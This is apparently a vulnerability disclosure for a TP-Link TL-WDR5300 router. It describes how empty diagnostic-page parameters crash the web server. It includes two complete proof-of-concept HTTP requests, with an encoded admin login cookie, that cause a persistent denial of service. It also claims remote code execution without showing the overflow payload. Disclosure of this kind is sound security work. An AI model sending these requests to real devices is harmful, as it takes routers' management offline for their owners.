# Stack-based Buffer Overflow and Multiple Input Validation Vulnerabilities in TP-Link TL-WDR5300 V2.0
Manufacturer: TP-Link

Model: TL-WDR5300 V2.0

Firmware Version: 3.13.35 Build 140311 Rel.34971n

# Vulnerability Overview
Title: Multiple Improper Input Validation Vulnerabilities in Diagnostic Module

Description: The diagnostic endpoint /userRpm/PingIframeRpm.htm lacks proper validation for multiple parameters, leading to a NULL Pointer Dereference or Process Crash. 
Specifically, omitting or providing empty values for the following parameters triggers an immediate segmentation fault in the httpd daemon:

isNew
sendNum
pSize
overTime

Impact: Persistent Denial of Service (DoS)

Upon sending the malformed request (either the overflow payload or empty parameters), the httpd daemon encounters a Segmentation Fault. Since the httpd service is responsible for the web management interface, the router becomes completely inaccessible via the browser. 
This results in a persistent Denial of Service, requiring a physical power cycle to restore administrative access.

Impact: > 1. Remote Code Execution (RCE): Overwriting the $RA register via ping_addr allows for arbitrary command execution. 2. System Inaccessibility: Triggering the NULL pointer dereference (via empty parameters) causes the web management service to terminate. The administrator loses all control over the device until a hard reboot is performed.



### Denial of Service (DoS) via Parameter Omission
The diagnostic module fails to handle empty or missing parameters. Sending the following request will cause the `httpd` daemon to crash (Segmentation Fault):
`GET /userRpm/PingIframeRpm.htm?ping_addr=127.0.0.1&isNew=&sendNum=&pSize=&overTime= HTTP/1.1`

# POC1
```
GET /userRpm/PingIframeRpm.htm?ping_addr=127.0.0.1&doType=ping&isNew=&sendNum=4&pSize=64&overTime=1000 HTTP/1.1

Host: 192.168.1.1

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://192.168.1.1/userRpm/WanDynamicIpCfgRpm.htm?wantype=0&mtu=1500&hostName=TL-WDR5300&downBandwidth=100000&upBandwidth=100000&Save=%B1%A3+%B4%E6

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: Authorization=Basic%20YWRtaW46ODg4ODg4ODg%3D

Connection: close
```
# poc2
```
GET /userRpm/PingIframeRpm.htm?ping_addr=127.0.0.1&doType=ping&isNew=new&sendNum=&pSize=64&overTime=1000 HTTP/1.1

Host: 192.168.1.1

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://192.168.1.1/userRpm/WanDynamicIpCfgRpm.htm?wantype=0&mtu=1500&hostName=TL-WDR5300&downBandwidth=100000&upBandwidth=100000&Save=%B1%A3+%B4%E6

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: Authorization=Basic%20YWRtaW46ODg4ODg4ODg%3D

Connection: close
```
POC omitting the remaining two parameters
<img width="2021" height="1191" alt="image" src="https://github.com/user-attachments/assets/ca033cb2-6363-4e28-ab3a-57f893826964" />
<img width="1979" height="1186" alt="image" src="https://github.com/user-attachments/assets/ab2d7c7f-a06e-4080-be9f-97206a5684a2" />
<img width="1776" height="1150" alt="image" src="https://github.com/user-attachments/assets/e9153151-b611-4910-a117-2a2c0fa5ea59" />



